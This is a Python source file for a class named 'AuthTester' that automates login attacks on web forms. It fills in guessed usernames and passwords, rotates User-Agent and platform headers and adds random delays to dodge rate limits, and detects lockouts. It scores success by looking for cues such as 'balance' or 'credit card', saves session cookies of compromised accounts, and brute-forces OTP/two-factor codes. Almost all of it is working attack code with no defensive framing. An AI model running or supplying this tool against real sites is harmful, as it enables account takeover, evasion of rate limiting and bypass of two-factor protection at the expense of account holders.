import requests
import random
import time
import json
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
class AuthTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.brute_force_detected = False
        self.last_response = None
        self.successful_usernames = set()
        self.login_page_url = None
        self.original_login_form = None
        self.response_sizes = {} # Store response sizes for comparison
        self.baseline_size = None
        self.baseline_otp_detected = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        self.default_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Ch-Ua': '"(Not(A:Brand";v="99", "Google Chrome";v="132", "Chromium";v="132"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"macOS"',
            'Sec-Ch-Ua-Full-Version-List': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="132", "Chromium";v="132"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Priority': 'u=0, i'
        }
        self.platforms = ['macOS', 'Windows', 'iOS', 'Linux']
       
    def detect_bruteforce(self, response):
        self.last_response = response
        brute_keywords = ['too many attempts', 'blocked', 'dibatasi', 'terlalu banyak', 'blokir', 'suspicious', 'rate limit exceeded']
        if response.status_code == 429 or (response.status_code >= 500 and response.status_code < 600):
            return True
        if any(keyword in response.text.lower() for keyword in brute_keywords):
            return True
        return False
       
    def refresh_login_form(self):
        """Fetch the login page again to get fresh CSRF tokens and timestamps"""
        if not self.login_page_url:
            return None
       
        # Rotasi User-Agent dan platform
        current_ua = random.choice(self.user_agents)
        current_platform = random.choice(self.platforms)
       
        headers = self.default_headers.copy() # Mulai dari default
        headers.update({
            'User-Agent': current_ua,
            'Referer': self.login_page_url,
            'Origin': urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc,
            'Sec-Ch-Ua-Platform': f'"{current_platform}"',
        })
           
        response = self.session.get(self.login_page_url, headers=headers)
        if response.status_code != 200:
            return None
           
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
       
        for form in forms:
            if form.find('input', {'type': 'password'}):
                inputs = []
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                enctype = form.get('enctype', 'application/x-www-form-urlencoded').lower()
               
                if action:
                    action = urljoin(self.base_url, action)
                else:
                    action = self.login_page_url
               
                # Identify username and password fields
                username_field_candidates = []
                password_field = None
               
                for inp in form.find_all('input'):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', 'text')
                    input_value = inp.get('value', '')
                   
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': input_value
                    })
                   
                    # Check for password field
                    if input_type == 'password':
                        password_field = input_name
                   
                    # Collect potential username fields
                    if input_type in ['text', 'email', 'number']:
                        username_field_candidates.append(input_name)
               
                # Try to identify the correct username field
                username_field = None
               
                # Strategy 1: Look for common username field names
                common_username_names = ['login', 'user', 'username', 'email', 'account']
                for candidate in username_field_candidates:
                    if any(name in candidate.lower() for name in common_username_names):
                        username_field = candidate
                        break
               
                # Strategy 2: If only one candidate, use it
                if not username_field and len(username_field_candidates) == 1:
                    username_field = username_field_candidates[0]
               
                # Strategy 3: Use the first candidate
                if not username_field and username_field_candidates:
                    username_field = username_field_candidates[0]
               
                # Check if form is complicated (has tokens or session cookies with values)
                has_hidden_with_value = any(
                    inp.get('type') == 'hidden' and inp.get('value', '') != ''
                    for inp in inputs
                )
                has_session_cookie = 'Cookie' in dict(response.request.headers) and 'session' in dict(response.request.headers)['Cookie'].lower()
                is_complicated = has_hidden_with_value or has_session_cookie
               
                # Baseline OTP detected (narrowed)
                otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
                baseline_otp_detected = any(keyword in response.text.lower() for keyword in otp_keywords) and (
                    '/sessions/two-factor' in action.lower() or 'two-factor' in self.login_page_url.lower() or 'otp' in self.login_page_url.lower()
                )
                self.baseline_otp_detected = baseline_otp_detected
               
                # Baseline size
                self.baseline_size = len(response.text)
               
                return {
                    'action': action,
                    'method': method,
                    'inputs': inputs,
                    'username_field': username_field,
                    'password_field': password_field,
                    'is_complicated': is_complicated,
                    'headers': dict(response.request.headers),
                    'baseline_size': self.baseline_size,
                    'baseline_otp_detected': self.baseline_otp_detected,
                    'enctype': enctype
                }
        return None
           
    def try_login(self, login_data, username, password):
            # Set baseline from login_data if available
            self.baseline_otp_detected = login_data.get('baseline_otp_detected', False)
            self.baseline_size = login_data.get('baseline_size', None)
            # Skip if username already successful
            if username in self.successful_usernames:
                return False, False
               
            # Store the login page URL for refreshing
            if not self.login_page_url:
                self.login_page_url = login_data.get('action', '').replace('/session', '/login')
               
            # Store original login form for comparison
            if not self.original_login_form:
                self.original_login_form = login_data
               
            # Refresh the form if it's complicated (this sets baseline)
            if login_data.get('is_complicated', False):
                fresh_login_data = self.refresh_login_form()
                if fresh_login_data:
                    login_data = fresh_login_data
               
            url = login_data['action']
            method = login_data['method'].lower()
           
            # Prepare headers dinamis
            headers = self.default_headers.copy()
            headers.update(login_data.get('headers', {})) # Ambil dari login_data atau fresh
            headers['User-Agent'] = random.choice(self.user_agents)
            headers['Referer'] = self.login_page_url
            headers['Origin'] = urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc
           
            # Prepare data with all form fields, including hidden ones
            data = {inp['name']: inp['value'] for inp in login_data['inputs'] if inp.get('name')}
           
            # Get the identified username and password fields
            username_field = login_data.get('username_field')
            password_field = login_data.get('password_field')
           
            if not username_field or not password_field:
                print("[-] Could not identify username or password field")
                return False, False
           
            # Update with current credentials
            data[username_field] = username
            data[password_field] = password
           
            # Print what's being posted
            print(f"[*] POST data: {data}")
            print(f"[*] Headers: {headers}")
           
            # Initialize response_sizes with baseline if first attempt
            if not self.response_sizes and self.baseline_size is not None:
                self.response_sizes['baseline'] = self.baseline_size
           
            enctype = login_data.get('enctype', 'application/x-www-form-urlencoded').lower()
            if 'Content-Type' in headers:
                del headers['Content-Type']
           
            if method == 'post':
                if 'multipart' in enctype:
                    post_data = {k: (None, str(v)) for k, v in data.items()}
                    response = self.session.post(url, files=post_data, headers=headers, allow_redirects=True)
                elif 'json' in enctype:
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(url, json=data, headers=headers, allow_redirects=True)
                else:
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    response = self.session.post(url, data=data, headers=headers, allow_redirects=True)
            else:
                response = self.session.get(url, params=data, headers=headers, allow_redirects=True)
           
            # Tambahkan delay random untuk menghindari rate limit
            time.sleep(random.uniform(0.5, 1.5))
           
            # Track redirects
            if response.history:
                print(f"[*] Redirect chain:")
                for i, redirect in enumerate(response.history):
                    print(f" {i}. {redirect.url} ({redirect.status_code})")
                print(f" Final URL: {response.url}")
           
            # Detect brute force
            if self.detect_bruteforce(response):
                self.brute_force_detected = True
                return False, False
           
            # Evaluate if login was successful
            login_success, score, otp_detected = self.evaluate_login_success(response)
           
            print(f"[*] Login score: {score}")
           
            if login_success:
                self.successful_usernames.add(username)
                # Update response sizes with this response
                self.response_sizes[username] = len(response.text)
                return True, otp_detected
            return False, otp_detected
    
    def evaluate_login_success(self, response):
        """Evaluate login success using a scoring system with context-aware checks"""
        score = 0
        soup = BeautifulSoup(response.text, 'html.parser')
        content_lower = response.text.lower()
        final_url = response.url
       
        # A. Success indicators (+1 each): Look for links or buttons with these texts
        success_indicators = ['logout', 'dashboard', 'welcome', 'my account', 'sign out', 'profile', 'logged in', 'user info', 'account', 'settings', 'balance', 'credit card', 'your information', 'session started']
        for indicator in success_indicators:
            # Check in <a> tags (navbar links)
            if soup.find('a', string=lambda text: text and indicator in text.lower()):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in <a> tag")
            # Or in visible div/span with class indicating success
            elif soup.find(lambda tag: tag.name in ['div', 'span', 'p', 'h1', 'h2', 'h3'] and indicator in tag.text.lower() and any(cls in tag.get('class', []) for cls in ['success', 'info', 'welcome'])):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in success message")
       
        # B. Failure indicators (-2 each): Look in <p>, <div> with error class, or visible alerts
        failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'bad', 'not found', 'try again', 'authentication failed', 'access denied', 'sorry', 'login failed']
        for indicator in failure_indicators:
            # Check in <p> tags
            if soup.find('p', string=lambda text: text and indicator in text.lower()):
                score -= 2
                print(f"[-] Found failure indicator: '{indicator}' in <p> tag")
            # Or in div with class like 'error', 'alert', etc., and not hidden
            elif soup.find('div', attrs={'class': lambda c: c and any(cls in c for cls in ['error', 'alert', 'flash-error', 'danger'])}):
                if indicator in soup.text.lower() and 'hidden' not in soup.find('div').attrs:
                    score -= 2
                    print(f"[-] Found failure indicator: '{indicator}' in visible error div")
            # Add check in <span> or <h2> etc.
            found_tag = soup.find(lambda tag: tag.name in ['span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'] and indicator in tag.text.lower())
            if found_tag:
                score -= 2
                print(f"[-] Found failure indicator: '{indicator}' in {found_tag.name} tag")
       
        # Special handling for 'login': Check in <button> or <h1>-<h6>
        if soup.find('button', string=lambda text: text and 'login' in text.lower()) or \
        any(soup.find(f'h{i}', string=lambda text: text and 'login' in text.lower()) for i in range(1,7)):
            score -= 2
            print(f"[-] Found failure indicator: 'login' in <button> or <h#> tag")
       
        # C. Check if still on login page
        if not self.is_still_login_page(response):
            score += 1
            print("[+] Not on login page anymore")
        else:
            score -= 1
            print("[-] Still on login page")
       
        # D. Different page (redirect)
        if (final_url != self.login_page_url and
            final_url != self.original_login_form.get('action', '')):
            score += 1
            print("[+] Redirected to different page")
            if any(word in final_url.lower() for word in ['dashboard', 'home', 'profile', 'user', 'account']):
                score += 1
                print("[+] Redirected to a likely success page")
        else:
            score -= 1
            print("[-] Not redirected to different page")
       
        # E. Response size comparison (20% diff)
        current_size = len(response.text)
        if self.response_sizes:
            avg_prev_size = sum(self.response_sizes.values()) / len(self.response_sizes)
            diff_percent = abs(current_size - avg_prev_size) / avg_prev_size * 100 if avg_prev_size > 0 else 0
            if diff_percent > 20:
                score += 2
                print(f"[+] Significant response size difference: {current_size} vs avg {avg_prev_size:.2f} ({diff_percent:.2f}%)")
                # Add if larger, perhaps success
                if current_size > avg_prev_size:
                    score += 1
                    print("[+] Response larger than average, likely success")
            else:
                score -= 1
                print(f"[-] Minor response size difference: {current_size} vs avg {avg_prev_size:.2f} ({diff_percent:.2f}%)")
        else:
            print("[-] No baseline size for comparison")
       
        # F. OTP detection (+2 if detected and not in baseline): Check in form labels or inputs
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
        otp_detected = False
        for keyword in otp_keywords:
            # Look in form-related elements
            if (soup.find('label', string=lambda text: text and keyword in text.lower()) or
                soup.find('input', attrs={'placeholder': lambda p: p and keyword in p.lower()}) or
                soup.find('form', {'action': lambda x: x and 'two-factor' in x.lower()})):
                otp_detected = True
                break
        otp_in_url = any(keyword in final_url.lower() for keyword in otp_keywords)
        if (otp_detected or otp_in_url) and not self.baseline_otp_detected:
            score += 2
            print("[+] OTP keywords detected (not in baseline)")
       
        # Determine success (>=3)
        login_success = score >= 3
       
        return login_success, score, otp_detected

    def evaluate_otp_success(self, response):
        """Evaluate OTP success using scoring system with context-aware checks"""
        score = 0
        soup = BeautifulSoup(response.text, 'html.parser')
        content_lower = response.text.lower() # Still use for broad checks if needed
       
        # Success indicators (+1 each): Look for links or buttons with these texts
        success_indicators = ['logout', 'dashboard', 'welcome', 'my account', 'sign out', 'profile', 'logged in', 'user info', 'account', 'settings', 'balance', 'credit card', 'your information', 'session started']
        for indicator in success_indicators:
            # Check in <a> tags (navbar links)
            if soup.find('a', string=lambda text: text and indicator in text.lower()):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in <a> tag")
            # Or in visible div/span with class indicating success
            elif soup.find(lambda tag: tag.name in ['div', 'span', 'p', 'h1', 'h2', 'h3'] and indicator in tag.text.lower() and any(cls in tag.get('class', []) for cls in ['success', 'info', 'welcome'])):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in success message")
       
        # Failure indicators (-2 each): Look in <p>, <div> with error class, or visible alerts
        failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'bad', 'not found', 'try again', 'authentication failed', 'access denied', 'sorry', 'login failed']
        for indicator in failure_indicators:
            # Check in <p> tags
            if soup.find('p', string=lambda text: text and indicator in text.lower()):
                score -= 2
                print(f"[-] Found failure indicator: '{indicator}' in <p> tag")
            # Or in div with class like 'error', 'alert', etc., and not hidden
            elif soup.find('div', attrs={'class': lambda c: c and any(cls in c for cls in ['error', 'alert', 'flash-error', 'danger'])}):
                if indicator in soup.text.lower() and 'hidden' not in soup.find('div').attrs:
                    score -= 2
                    print(f"[-] Found failure indicator: '{indicator}' in visible error div")
            # Add check in <span> or <h2> etc.
                found_tag = soup.find(lambda tag: tag.name in ['span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'] and indicator in tag.text.lower())
                if found_tag:
                    score -= 2
                    print(f"[-] Found failure indicator: '{indicator}' in {found_tag.name} tag")
       
        # Special handling for 'login': Check in <button> or <h1>-<h6>
        if soup.find('button', string=lambda text: text and 'login' in text.lower()) or \
        any(soup.find(f'h{i}', string=lambda text: text and 'login' in text.lower()) for i in range(1,7)):
            score -= 2
            print(f"[-] Found failure indicator: 'login' in <button> or <h#> tag")
       
        # OTP keywords (present -1, absent +1): Check if in form labels or inputs
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
        otp_detected = False
        for keyword in otp_keywords:
            # Look in form-related elements
            if (soup.find('label', string=lambda text: text and keyword in text.lower()) or
                soup.find('input', attrs={'placeholder': lambda p: p and keyword in p.lower()})):
                otp_detected = True
                break
        if otp_detected:
            score -= 1
        else:
            score += 1
       
        # Redirect or size can be added if needed, but simplified
       
        return score >= 3, score
    
    def is_still_login_page(self, response):
        """Check if the response still contains a login form"""
        soup = BeautifulSoup(response.text, 'html.parser')
       
        # Check for password fields
        if soup.find('input', {'type': 'password'}):
            return True
       
        # Check if the form structure matches the original login form
        forms = soup.find_all('form')
        for form in forms:
            username_field = self.original_login_form.get('username_field')
            password_field = self.original_login_form.get('password_field')
           
            if username_field and form.find('input', {'name': username_field}):
                if password_field and form.find('input', {'type': 'password', 'name': password_field}):
                    return True
       
        return False
    
    def check_otp_required(self):
        if not self.last_response:
            return False
       
        # Narrowed check for OTP
        soup = BeautifulSoup(self.last_response.text, 'html.parser')
        content_lower = self.last_response.text.lower()
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
        otp_in_content = any(keyword in content_lower for keyword in otp_keywords)
        otp_in_url = any(keyword in self.last_response.url.lower() for keyword in otp_keywords)
        otp_form = soup.find('form')  # Simplified
        return otp_in_content or otp_in_url or otp_form is not None

    def detect_otp_details(self, response):
        """Detect OTP length and type from form"""
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        length = None
        otp_type = 'number' # Default to number
       
        for form in forms:
            # Look for single input with pattern or placeholder
            otp_inputs = form.find_all('input', attrs={'name': lambda x: x and any(k in x.lower() for k in ['otp', 'code', 'token', 'verification'])})
            for inp in otp_inputs:
                pattern = inp.get('pattern', '')
                placeholder = inp.get('placeholder', '')
                inputmode = inp.get('inputmode', '')
                inp_type = inp.get('type', '')
               
                # Detect length from placeholder like 'XXXXXX'
                if placeholder and len(placeholder) > 0 and all(c == placeholder[0] for c in placeholder):
                    length = len(placeholder)
               
                # From pattern like [0-9]{6}
                if '{6}' in pattern:
                    length = 6
                elif '{4}' in pattern:
                    length = 4
                # Add more if needed
               
                # Type
                if 'numeric' in inputmode or inp_type == 'number' or '[0-9]' in pattern:
                    otp_type = 'number'
                elif '[0-9a-fA-F]' in pattern:
                    otp_type = 'alphanum'
           
            # Multiple single-digit inputs
            single_inputs = form.find_all('input', attrs={'maxlength': '1'})
            if single_inputs:
                length = len(single_inputs)
                if all(inp.get('type') == 'number' for inp in single_inputs):
                    otp_type = 'number'
       
        return length, otp_type
   
    def save_cookies(self, username):
        cookie_dict = self.session.cookies.get_dict()
        print(f"[+] Cookies obtained: {cookie_dict}") # Print for verification
        with open(f"data/cookies_{username}.txt", 'w') as f:
            json.dump(cookie_dict, f)
        print(f"[+] Cookies saved for {username}")
   
    def reset_session(self):
        self.session = requests.Session()
        self.last_response = None
   
    def otp_bruteforce(self, otp_form, length=6, otp_type='number', max_attempts=1000):
        url = otp_form['action']
        method = otp_form['method'].lower()
        data = {inp['name']: inp['value'] for inp in otp_form['inputs'] if inp['name']}
       
        otp_fields = []
        for inp in otp_form['inputs']:
            name = inp.get('name', '')
            if name and any(x in name.lower() for x in ['otp', 'code', 'token', 'verification']):
                otp_fields.append(name)
       
        if not otp_fields:
            return None
       
        if len(otp_fields) > 1:
            length = len(otp_fields)
            otp_type = 'number'  # Default for split fields
       
        chars = '0123456789' if otp_type == 'number' else '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
       
        # Prepare headers
        headers = self.default_headers.copy()
        headers['Referer'] = self.last_response.url if self.last_response else url
        headers['Origin'] = urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc
        headers['User-Agent'] = random.choice(self.user_agents)
        if 'Content-Type' in headers:
            del headers['Content-Type']
       
        enctype = otp_form.get('enctype', 'application/x-www-form-urlencoded').lower()
       
        for _ in range(max_attempts):
            otp = ''.join(random.choices(chars, k=length))
            temp_data = data.copy()
            if len(otp_fields) == 1:
                temp_data[otp_fields[0]] = otp
            else:
                for i, char in enumerate(otp):
                    temp_data[otp_fields[i]] = char
           
            if method == 'post':
                if 'multipart' in enctype:
                    post_data = {k: (None, str(v)) for k, v in temp_data.items()}
                    response = self.session.post(url, files=post_data, headers=headers)
                elif 'json' in enctype:
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(url, json=temp_data, headers=headers)
                else:
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    response = self.session.post(url, data=temp_data, headers=headers)
            else:
                response = self.session.get(url, params=temp_data, headers=headers)
           
            if self.detect_bruteforce(response):
                return "BLOCKED"
           
            success, score = self.evaluate_otp_success(response)
            if success:
                return otp
               
            time.sleep(0.3) # Minimal delay for brute
        return None
   
    def try_otp(self, otp_form, otp_code):
        url = otp_form['action']
        method = otp_form['method'].lower()
        data = {inp['name']: inp['value'] for inp in otp_form['inputs'] if inp['name']}
       
        otp_fields = []
        for inp in otp_form['inputs']:
            name = inp.get('name', '')
            if name and any(x in name.lower() for x in ['otp', 'code', 'token', 'verification']):
                otp_fields.append(name)
       
        if not otp_fields:
            print("[-] Could not identify OTP field")
            return False
       
        length = len(otp_fields) if len(otp_fields) > 1 else len(otp_code)
       
        if len(otp_fields) > 1 and len(otp_code) != length:
            print("[-] OTP code length mismatch for split fields")
            return False
       
        if len(otp_fields) == 1:
            data[otp_fields[0]] = otp_code
        else:
            for i, char in enumerate(otp_code):
                data[otp_fields[i]] = char
       
        # Prepare headers
        headers = self.default_headers.copy()
        headers['Referer'] = self.last_response.url if self.last_response else url
        headers['Origin'] = urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc
        headers['User-Agent'] = random.choice(self.user_agents)
        if 'Content-Type' in headers:
            del headers['Content-Type']
       
        enctype = otp_form.get('enctype', 'application/x-www-form-urlencoded').lower()
       
        if method == 'post':
            if 'multipart' in enctype:
                post_data = {k: (None, str(v)) for k, v in data.items()}
                response = self.session.post(url, files=post_data, headers=headers)
            elif 'json' in enctype:
                headers['Content-Type'] = 'application/json'
                response = self.session.post(url, json=data, headers=headers)
            else:
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                response = self.session.post(url, data=data, headers=headers)
        else:
            response = self.session.get(url, params=data, headers=headers)
       
        if self.detect_bruteforce(response):
            self.brute_force_detected = True
            return False
       
        success, score = self.evaluate_otp_success(response)
        print(f"[*] OTP score: {score}")
        return success